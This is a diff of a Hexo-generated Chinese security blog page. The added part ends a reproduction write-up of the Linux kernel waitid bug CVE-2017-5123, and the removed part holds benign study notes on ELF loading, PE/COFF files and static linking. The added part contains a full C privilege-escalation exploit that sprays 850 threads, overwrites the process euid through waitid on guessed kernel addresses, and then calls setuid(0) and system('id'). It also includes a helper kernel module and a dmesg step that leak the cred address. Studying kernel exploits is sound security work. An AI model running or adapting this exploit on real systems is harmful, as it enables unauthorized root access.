class="literal">NULL</span>, &amp;my_fops);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!my_file) &#123;</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit</span></span><br><span class="line"><span class="function"><span class="title">my_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    remove_proc_entry(<span class="string">&quot;jif&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">module_init(my_init);</span><br><span class="line">module_exit(my_exit);</span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Makefile</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>利用 <code>dmesg | grep EUID</code>获得<code>cred.euid</code>的地址；</p>
+</li>
+</ul>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>首先创建一个400权限的文件；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch file &amp;&amp; chmod 400 file</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/unistd_64.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_THREADS 19970</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 256</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">size_t</span> startup_64,prepare_kernel_cred,commit_creds,offset;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> success_flag=<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cpu_affinity</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">cpu_set_t</span> mask;</span><br><span class="line">    CPU_ZERO(&amp;mask);</span><br><span class="line">    CPU_SET(<span class="number">0</span>,&amp;mask);</span><br><span class="line">    <span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>,<span class="keyword">sizeof</span>(mask),&amp;mask))</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;set single CPU failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spray</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//open(&quot;/proc/jif&quot;);</span></span><br><span class="line">    set_cpu_affinity();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/jif&quot;</span>,O_RDWR);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">int</span> euid;</span><br><span class="line">    <span class="keyword">int</span> old = geteuid();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        euid = syscall(__NR_geteuid);</span><br><span class="line">        <span class="keyword">if</span>(old!=euid)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*]success!\n&quot;</span>);</span><br><span class="line">            success_flag=<span class="number">0</span>;</span><br><span class="line">            <span class="comment">//printf(&quot;[*]pid:%d euid:%d uid:%d\n&quot;,getpid(),geteuid(),getuid());   </span></span><br><span class="line">            setuid(<span class="number">0</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*]pid:%d euid:%d uid:%d\n&quot;</span>,getpid(),geteuid(),getuid());</span><br><span class="line">            system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;cat cve-2017-5123&quot;</span>);      </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!success_flag)&#123;</span><br><span class="line">            sleep(<span class="number">100000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    usleep(<span class="number">100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line"><span class="comment">//    set_cpu_affinity();</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">850</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">void</span> *<span class="built_in">stack</span>=<span class="built_in">malloc</span>(STACK_SIZE);</span><br><span class="line">        pid = clone(spray,<span class="built_in">stack</span>,CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SYSVSEM | SIGCHLD,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(pid==<span class="number">-1</span>)&#123;</span><br><span class="line">            perror(<span class="string">&quot;[-]clone failed!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">size_t</span> start_addr = <span class="number">0xffff88000d3b0004</span>;</span><br><span class="line">    <span class="keyword">size_t</span> end_addr =   <span class="number">0xffff88000d3b0ff4</span>;</span><br><span class="line">    <span class="keyword">size_t</span> inc = <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]clone 850 over\n&quot;</span>);</span><br><span class="line"><span class="comment">//    getchar();</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> address = start_addr;success_flag;address += inc)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]attacking 0x%llx\n&quot;</span>,address);</span><br><span class="line">        syscall(SYS_waitid, P_ALL,<span class="number">0</span>,address, WEXITED|WNOHANG|__WNOTHREAD, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(address &gt; end_addr)&#123;<span class="built_in">printf</span>(<span class="string">&quot;failed to pwn\n&quot;</span>);<span class="built_in">exit</span>(<span class="number">0</span>);&#125;</span><br><span class="line">        usleep(<span class="number">100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="https://www.jk404.cn/page/2/index.html">https://www.jk404.cn/page/2/index.html</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div class="article-tag-wrap">
+          
+
+          
+          
+
+
+        </div>
+      
+      
+      
+    </footer>
+  </div>
+</article>
+
+
   <article id="post-CVE-2021-3156" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner">
     
@@ -1387,361 +1820,6 @@
 </article>
 
 
-  <article id="post-load" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/load/">load</a>
-    </h1>
-  
-
-
-      </header>
-    
-    <div class="article-meta">
-      
-      <span class="article-date">
-  <i class="fa fa-date"></i>
-  <time class="dt-published" datetime="2021-11-22T06:22:14.000Z" itemprop="datePublished">2021年11月22日</time>
-</span>
-      
-  <div class="article-category">
-    <i class="fa fa-classify"></i>
-    <a class="article-category-link" href="/categories/study/">study</a> > <a class="article-category-link" href="/categories/study/book/">book</a> > <a class="article-category-link" href="/categories/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/">程序员的自我修养：链接、装载与库</a>
-  </div>
-
-      
-      
-<a href="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/load/#comments" class="article-comment-link">
-  
-  <i class="fa fa-commt"></i>
-  留言
-</a>
-
-
-    </div>
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="Load"><a href="#Load" class="headerlink" title="Load"></a>Load</h1><h2 id="程序和进程"><a href="#程序和进程" class="headerlink" title="程序和进程"></a>程序和进程</h2><p>程序是静态的可执行文件，进程是动态的运行过程；</p>
-<p>每个程序运行起来后，即进程，都拥有自己独立的虚拟地址空间；</p>
-<p>其中一部分是操作系统内核空间，另一部分是抽象的独立的进程空间；</p>
-<h2 id="程序员角度的装载"><a href="#程序员角度的装载" class="headerlink" title="程序员角度的装载"></a>程序员角度的装载</h2><p>程序执行和数据必须在内存中才能被CPU运行；</p>
-<p>动态装入，程序最常用的部分驻留与内存中，不常用的数据置于磁盘中；</p>
-<h3 id="覆盖装入"><a href="#覆盖装入" class="headerlink" title="覆盖装入"></a>覆盖装入</h3><p>共享则相互覆盖–树型调用</p>
-<h3 id="页映射"><a href="#页映射" class="headerlink" title="页映射"></a>页映射</h3><p>分成若干页，装载和操作的单位是页，一般4KB；</p>
-<p>用到哪一页就装入，考虑算法</p>
-<ol>
-<li>FIFO（先进先出）</li>
-<li>LUR（使用频率）</li>
-</ol>
-<h2 id="操作系统角度的装载"><a href="#操作系统角度的装载" class="headerlink" title="操作系统角度的装载"></a>操作系统角度的装载</h2><h3 id="进程建立"><a href="#进程建立" class="headerlink" title="进程建立"></a>进程建立</h3><ol>
-<li><p>创建一个独立虚拟地址空间，实际上是创建页映射函数，映射到物理地址</p>
-</li>
-<li><p>读取可执行文件的文件头，建立与地址空间的映射关系，这里的粒度<code>0x1000 = 4096 bytes = 4KB</code></p>
-<p>这样的映射关系实际上只保存在一个数据结构中；</p>
-<p><img src="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/load/elf-vma.png" alt="elf-vma"></p>
-</li>
-<li><p>指令寄存器设置为可执行文件的入口地址，即<code>ELF header</code>中保存的入口地址，启动运行</p>
-<p>此时，控制权转交给了进程，涉及到了用户态和内核态的切换，CPU权限的切换；；</p>
-</li>
-</ol>
-<h3 id="页错误"><a href="#页错误" class="headerlink" title="页错误"></a>页错误</h3><p>完成上面三个步骤后，指令和数据还没有被载入内存，只是完成了载入的映射关系，相当于把路打通了，但是还没有开始通车；</p>
-<p>CPU打算执行这个内存空间后，发现<code>0x08048000-0x08049000</code>根本就是空页面，于是就会触发页错误（page fault），将控制权转交给操作系统，启用专门的处理历程；</p>
-<p>操作系统将查询映射时建立的数据结构，找到对应的空页面地址，计算相应页面在可执行文件中的偏移，然后在物理内存中分配物理页面，将进程中该虚拟页与分配的物理页建立映射关系，然后将控制权交给进程，从页错误中断处继续执行；</p>
-<p>同样，操作系统将会不断地根据页错误来分配物理页面，因为物理空间并非无穷大，所以涉及到内存管理的问题；</p>
-<h2 id="进程虚拟空间分布"><a href="#进程虚拟空间分布" class="headerlink" title="进程虚拟空间分布"></a>进程虚拟空间分布</h2><h3 id="Segment和Section"><a href="#Segment和Section" class="headerlink" title="Segment和Section"></a>Segment和Section</h3><p>合并权限相同的段，以段权限为划分装载，此时就可以将权限段看做一个<code>Segment</code>，因此可以说，一个<code>Segment</code>可能包含多个<code>section</code>，他们的权限相同；</p>
-<p>又可以说，Segment是从装载的角度看，而ELF文件是以Section来存储的；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -l sample.elf</span><br></pre></td></tr></table></figure>
-
-<p>可以查看可执行文件段与虚拟空间的映射关系；</p>
-<p>所以Segment是装载角度，而Section是链接角度</p>
-<h3 id="Stack和Heap"><a href="#Stack和Heap" class="headerlink" title="Stack和Heap"></a>Stack和Heap</h3><p>进程执行时还需要堆栈的支持；</p>
-<p>通常情况下，可以用一下命令查看进程的内存空间分布；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./sample.elf &amp;</span><br><span class="line">[1] 6666                 // 进程pid</span><br><span class="line">cat /proc/6666/maps</span><br></pre></td></tr></table></figure>
-
-<p>将显示的是，进程的虚拟空间范围，可执行权限，Segment在文件中的偏移，设备主号和次设备号，映像文件的节点号，以及文件路径；</p>
-<p>堆栈、vdso的设备号、节点号为0，表示没有映射文件，是匿名虚拟内存区域；</p>
-<p>vdso位于内核区域，是内核的一个模块，进程通过访问这个虚拟内存区域与内核进行一些通信；</p>
-<p>do_brk将.bss剩余部分放在堆区；</p>
-<h3 id="heap申请最大空间的问题"><a href="#heap申请最大空间的问题" class="headerlink" title="heap申请最大空间的问题"></a>heap申请最大空间的问题</h3><p>堆空间受多种因素影响，并不能完全利用；</p>
-<h3 id="段地址对齐"><a href="#段地址对齐" class="headerlink" title="段地址对齐"></a>段地址对齐</h3><p>以Segment分，每一页0x1000大小，会存在页内碎片；</p>
-<p>通过物理地址映射两份到虚拟地址，实现段合并，来减少碎片产生，此时物理页面可能包含多个section，而映射后虚拟地址也不是页面长度的整数倍；</p>
-<p>同时要解决段地址对齐的问题，对于任何一个可装载的Segment而言：</p>
-<p>p_vaddr / 对齐属性的余数 = p_offset / 对齐属性的余数</p>
-<h3 id="进程栈初始化"><a href="#进程栈初始化" class="headerlink" title="进程栈初始化"></a>进程栈初始化</h3><p>进程运行环境需要栈支持，需要在进程开始前对栈进行初始化；</p>
-<p>假设系统中有两个环境变量：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HOME=/home/user</span><br><span class="line">PATH=/usr/bin</span><br></pre></td></tr></table></figure>
-
-<p>假设可执行文件为exec，运行命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 123</span><br></pre></td></tr></table></figure>
-
-<p>那么初始化的栈是：</p>
-<p><img src="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/load/init_stack.jpg" alt="init_stack"></p>
-<p>esp指向栈顶，一个bytes表示命令行参数的数量，然后是两个参数的指针，指向<code>exec</code>和<code>123</code>的地址，后面是两个环境变量指针，指向两个环境变量；</p>
-<p>进程启动后，程序库部分把栈信息的参数传递给main，也就是<code>argc</code>和<code>argv</code>，对应参数数量和字符串指针数组；</p>
-<h2 id="内核装载ELF"><a href="#内核装载ELF" class="headerlink" title="内核装载ELF"></a>内核装载ELF</h2><p>在bash下执行一个程序，其过程是什么？</p>
-<h3 id="用户层"><a href="#用户层" class="headerlink" title="用户层"></a>用户层</h3><p>bash进程会调用fork系统调用，创建一个新的进程，然后新的进程调用<code>execve()</code>系统调用执行指定的ELF文件；</p>
-<p>原先的bash进程继续返回等待刚才启动的新进程的结束，然后等待用户输入命令；</p>
-<p>在进入<code>execve()</code>系统调用后，内核才开始真正的装载工作；</p>
-<h3 id="内核层"><a href="#内核层" class="headerlink" title="内核层"></a>内核层</h3><p><code>execve()</code>的入口是<code>sys_execve()</code>，在<code>arch/i386/kernel/Process.c</code>中定义；</p>
-<p>其进行参数的检查和复制之后，会调用<code>do_execve()</code>函数，查找被执行的文件是否存在，如果存在，则先读取前128字节，调用<code>search_binary_handle()</code>去搜索和匹配合适的可执行文件装载处理过程，如果搜索到了对应的处理过程，如ELF文件，就会调用<code>load_elf_binary()</code>进行装载；</p>
-<p><code>load_elf_binary()</code>的主要步骤有：</p>
-<ol>
-<li>检查ELF文件格式有效性；</li>
-<li>寻找动态链接<code>.interp</code>段，设置动态链接路径；</li>
-<li>根据elf header对文件进行映射；</li>
-<li>初始化ELF进程环境，比如进程启动的EDX寄存器的地址应该是<code>DT_FINI</code>的地址；</li>
-<li>将系统调用的返回地址修改为ELF可执行文件的入口地址，该入口取决于链接方式，如果是动态链接，那么入口地址是动态链接器；</li>
-</ol>
-<p><code>load_elf_binary()</code>执行完毕后，返回到<code>do_execve()</code>再返回到<code>sys_execve()</code>；</p>
-<p>当内核态返回到用户态的时候，及系统调用结束并返回，则返回到了入口地址处，新的程序继续执行，可执行文件被加载；</p>
-<h2 id="PE文件装载"><a href="#PE文件装载" class="headerlink" title="PE文件装载"></a>PE文件装载</h2><ul>
-<li>读取文件第一个页，第一个页中有DOS头，PE文件头和段表；</li>
-<li>检查进程空间是否可用，不可用另选一个装载地址（主要针对DLL，因为可执行文件一般都是第一个装载的模块）</li>
-<li>使用段表提供的信息，将所有段进行映射；</li>
-<li>如果装载地址不是目标地址，则进行rebasing；</li>
-<li>装载所有DLL文件；</li>
-<li>对所有导入符号进行解析；</li>
-<li>根据PE头指定的参数，建立初始化堆栈；</li>
-<li>建立主线程并启动进程；</li>
-</ul>
-
-        
-        
-          <blockquote id="copyright">
-              <p>原文链接: <a href="https://www.jk404.cn/page/2/index.html">https://www.jk404.cn/page/2/index.html</a></p>
-              <p>版权声明: 转载请注明出处.</p>
-          </blockquote>
-        
-      
-    </div>
-    <footer class="article-footer">
-      
-        <div class="article-tag-wrap">
-          
-
-          
-          
-
-
-        </div>
-      
-      
-      
-    </footer>
-  </div>
-</article>
-
-
-  <article id="post-PE文件" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/PE%E6%96%87%E4%BB%B6/">PE文件</a>
-    </h1>
-  
-
-
-      </header>
-    
-    <div class="article-meta">
-      
-      <span class="article-date">
-  <i class="fa fa-date"></i>
-  <time class="dt-published" datetime="2021-11-22T06:03:27.000Z" itemprop="datePublished">2021年11月22日</time>
-</span>
-      
-  <div class="article-category">
-    <i class="fa fa-classify"></i>
-    <a class="article-category-link" href="/categories/study/">study</a> > <a class="article-category-link" href="/categories/study/book/">book</a> > <a class="article-category-link" href="/categories/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/">程序员的自我修养：链接、装载与库</a>
-  </div>
-
-      
-      
-<a href="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/PE%E6%96%87%E4%BB%B6/#comments" class="article-comment-link">
-  
-  <i class="fa fa-commt"></i>
-  留言
-</a>
-
-
-    </div>
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="windows-PE-COFF"><a href="#windows-PE-COFF" class="headerlink" title="windows PE/COFF"></a>windows PE/COFF</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COFF -&gt; ELF/PE</span><br></pre></td></tr></table></figure>
-
-<p>书中，目标文件默认为COFF，可执行文件默认为PE；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text -&gt; .code   (visual c++)</span><br><span class="line">.text -&gt; CODE    (Borland)</span><br></pre></td></tr></table></figure>
-
-<p>段名没有实际意义，除了链接脚本控制链接的时候；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sample.c --cl--&gt; sample.obj --linker--&gt; sample.exe</span><br></pre></td></tr></table></figure>
-
-<p>使用<code>dumpbin</code>来查看<code>obj</code>文件；</p>
-<h2 id="COFF文件格式"><a href="#COFF文件格式" class="headerlink" title="COFF文件格式"></a>COFF文件格式</h2><p><img src="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/PE%E6%96%87%E4%BB%B6/coff_struct.jpg" alt="coff_struct"></p>
-<h2 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h2><p><img src="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/PE%E6%96%87%E4%BB%B6/pe_struct.jpg" alt="pe_struct"></p>
-<p><code>IMAGE_NT_HEADERS</code>是真正的PE文件头，其偏移信息保存在<code>IMAGE_DOS_HEADER</code>中，该信息为<code>e_lfanew</code>成员，如果为<code>0</code>，表示该PE文件为<code>DOS</code>的<code>MZ</code>文件，将会用DOS子系统执行，如果不为<code>0</code>，如上所示，则代表偏移；</p>
-<p>在<code>IMAGE_NT_HEADERS</code>中，包含一个标记（0x00004550，即<code>PE\0\0</code>）以及两个结构体（Image Header、Image Optional Header）；</p>
-<p>类似于ELF文件的信息放在了数据目录<code>Data Directory</code>中；</p>
-
-        
-        
-          <blockquote id="copyright">
-              <p>原文链接: <a href="https://www.jk404.cn/page/2/index.html">https://www.jk404.cn/page/2/index.html</a></p>
-              <p>版权声明: 转载请注明出处.</p>
-          </blockquote>
-        
-      
-    </div>
-    <footer class="article-footer">
-      
-        <div class="article-tag-wrap">
-          
-
-          
-          
-
-
-        </div>
-      
-      
-      
-    </footer>
-  </div>
-</article>
-
-
-  <article id="post-static-link" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/static-link/">static_link</a>
-    </h1>
-  
-
-
-      </header>
-    
-    <div class="article-meta">
-      
-      <span class="article-date">
-  <i class="fa fa-date"></i>
-  <time class="dt-published" datetime="2021-11-22T04:47:40.000Z" itemprop="datePublished">2021年11月22日</time>
-</span>
-      
-  <div class="article-category">
-    <i class="fa fa-classify"></i>
-    <a class="article-category-link" href="/categories/study/">study</a> > <a class="article-category-link" href="/categories/study/book/">book</a> > <a class="article-category-link" href="/categories/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/">程序员的自我修养：链接、装载与库</a>
-  </div>
-
-      
-      
-<a href="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/static-link/#comments" class="article-comment-link">
-  
-  <i class="fa fa-commt"></i>
-  留言
-</a>
-
-
-    </div>
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h1><h2 id="空间地址分配"><a href="#空间地址分配" class="headerlink" title="空间地址分配"></a>空间地址分配</h2><p>按序叠加</p>
-<p>相似合并</p>
-<ol>
-<li>空间地址分配：扫描、收集（符号定义和引用到全局符号表）、合并、建立映射</li>
-<li>符号解析与重定位：读取段信息、重定位信息，进行符号解析和重定位</li>
-</ol>
